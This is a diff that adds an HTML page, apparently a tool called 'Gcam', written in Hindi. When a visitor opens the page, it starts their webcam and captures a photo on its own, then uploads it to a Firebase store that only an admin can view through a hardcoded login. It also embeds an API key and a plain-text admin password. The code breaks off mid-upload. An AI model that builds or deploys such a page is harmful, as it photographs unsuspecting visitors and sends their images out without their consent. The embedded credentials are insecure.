@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gcam — निजी कैमरा कैप्चर सिस्टम</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+    html, body { height: 100%; }
+    body { font-family: 'Inter', sans-serif; background-color: #f7f7f7; }
+    .image-container::-webkit-scrollbar { width: 8px; }
+    .image-container::-webkit-scrollbar-track { background: #e0e0e0; border-radius: 10px; }
+    .image-container::-webkit-scrollbar-thumb { background: #6b7280; border-radius: 10px; }
+    .image-container::-webkit-scrollbar-thumb:hover { background: #4b5563; }
+  </style>
+</head>
+<body class="min-h-full p-4">
+  <div class="max-w-4xl mx-auto">
+    <header class="mb-6">
+      <h1 class="text-2xl font-bold">📸 Gcam — निजी कैमरा कैप्चर सिस्टम</h1>
+      <p class="text-gray-600">सिर्फ एडमिन लॉगिन के बाद डैशबोर्ड दिखेगा। विज़िटर के आते ही ऑटो-कैप्चर होगा।</p>
+    </header>
+
+    <!-- Status / Errors -->
+    <div id="status-message" class="mb-4 text-sm text-green-700"></div>
+    <div id="error-box" class="hidden bg-red-100 text-red-700 p-3 rounded mb-4">
+      <span id="error-text"></span>
+      <button onclick="closeErrorBox()" class="ml-2 text-sm underline">बंद करें</button>
+    </div>
+
+    <!-- Admin Login Gate -->
+    <section id="login-gate" class="bg-white rounded shadow p-4 mb-6">
+      <h2 class="text-lg font-semibold mb-3">🔐 एडमिन लॉगिन</h2>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+        <input id="admin-id" class="border rounded px-3 py-2" placeholder="एडमिन आईडी (8521574912)" />
+        <input id="admin-password" type="password" class="border rounded px-3 py-2" placeholder="पासवर्ड (rituraj@123)" />
+        <button id="login-button" class="bg-green-600 text-white rounded px-4 py-2">लॉगिन</button>
+      </div>
+      <p class="text-xs text-gray-500 mt-2">लॉगिन के बाद ही डैशबोर्ड में कैप्चर की गई फ़ोटो दिखेंगी।</p>
+    </section>
+
+    <!-- Capture View -->
+    <section id="capture-view" class="bg-white rounded shadow p-4 mb-6">
+      <h2 class="text-lg font-semibold mb-3">कैमरा</h2>
+      <video id="camera-stream" autoplay playsinline class="w-full rounded border mb-3"></video>
+      <div class="flex gap-3">
+        <button id="capture-button" class="bg-blue-600 text-white rounded px-4 py-2">📷 मैन्युअल कैप्चर</button>
+        <span id="capture-hint" class="text-xs text-gray-500">विज़िट पर ऑटो-कैप्चर चल रहा है…</span>
+      </div>
+    </section>
+
+    <!-- Admin-only Dashboard -->
+    <section id="dashboard-view" class="hidden bg-white rounded shadow p-4">
+      <h2 class="text-lg font-semibold mb-3">🗂️ डैशबोर्ड — कैप्चर की गई तस्वीरें</h2>
+      <div id="images-grid" class="grid grid-cols-2 md:grid-cols-3 gap-4 image-container overflow-y-auto max-h-[28rem]"></div>
+    </section>
+
+    <footer class="mt-8 text-center text-xs text-gray-500">
+      ब्रांडेड द्वारा — rituraj _ cybersecurity | INDIAGPT • Gcam
+    </footer>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+    import { getFirestore, collection, addDoc, serverTimestamp, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCsn3iH_Pd7gZMjLRxesAQpWiz8yB1WCqk",
+      authDomain: "privatecameracapture.firebaseapp.com",
+      projectId: "privatecameracapture",
+      storageBucket: "privatecameracapture.appspot.com",
+      messagingSenderId: "329207253992",
+      appId: "1:329207253992:web:6bb6b6bb54b7d8888252ed",
+      measurementId: "G-VF6F22ESHP"
+    };
+
+    const ADMIN_ID = "8521574912";
+    const ADMIN_PASSWORD = "rituraj@123";
+    const LOGIN_KEY = "admin_logged_in";
+    const STORAGE_ADMIN_ID = "8521574912";
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
+    const statusMessage = document.getElementById("status-message");
+    const errorBox = document.getElementById("error-box");
+    const errorText = document.getElementById("error-text");
+    const loginGate = document.getElementById("login-gate");
+    const dashboardView = document.getElementById("dashboard-view");
+    const imagesGrid = document.getElementById("images-grid");
+
+    const adminIdInput = document.getElementById("admin-id");
+    const adminPasswordInput = document.getElementById("admin-password");
+    const loginButton = document.getElementById("login-button");
+
+    const videoEl = document.getElementById("camera-stream");
+    const captureButton = document.getElementById("capture-button");
+
+    let userId = null;
+    let hasAutoCaptured = false;
+
+    signInAnonymously(auth)
+      .then(() => {
+        userId = auth.currentUser?.uid || "anonymous";
+        status("विज़िटर ऑथ सफल। यूज़र: " + userId);
+        startCamera().then(() => {
+          autoCaptureOnce();
+        });
+      })
+      .catch(err => showError("अनाम ऑथ विफल: " + err.message));
+
+    loginButton.addEventListener("click", () => {
+      const enteredId = (adminIdInput.value || "").trim();
+      const enteredPw = (adminPasswordInput.value || "").trim();
+
+      if (enteredId === ADMIN_ID && enteredPw === ADMIN_PASSWORD) {
+        sessionStorage.setItem(LOGIN_KEY, "true");
+        loginGate.classList.add("hidden");
+        dashboardView.classList.remove("hidden");
+        status("एडमिन लॉगिन सफल।");
+        subscribePhotos();
+      } else {
+        showError("गलत एडमिन ID या पासवर्ड।");
+      }
+    });
+
+    captureButton.addEventListener("click", async () => {
+      await captureAndSave();
+    });
+
+    async function autoCaptureOnce() {
+      if (hasAutoCaptured) return;
+      hasAutoCaptured = true;
+      await captureAndSave();
+    }
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        videoEl.srcObject = stream;
+      } catch (err) {
+        showError("कैमरा एक्सेस विफल: " + err.message);
+      }
+    }
+
+    async function captureAndSave() {
+      try {
+        captureButton.disabled = true;
+
+        const w = videoEl.videoWidth || 640;
+        const h = videoEl.videoHeight || 480;
+        const canvas = document.createElement("canvas");
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(videoEl, 0, 0, w, h);
+
+        const base64Image = canvas.toDataURL("image/jpeg", 0.8);
+
+        const photosRef = collection(
+          db,
+          "artifacts",
+          "gcam-app",
+          "users",
+          STORAGE_ADMIN_ID,
+          "captured_photos"
+        );
+
+        await addDoc(photosRef, {
+          base64Image,
+          timestamp: serverTimestamp
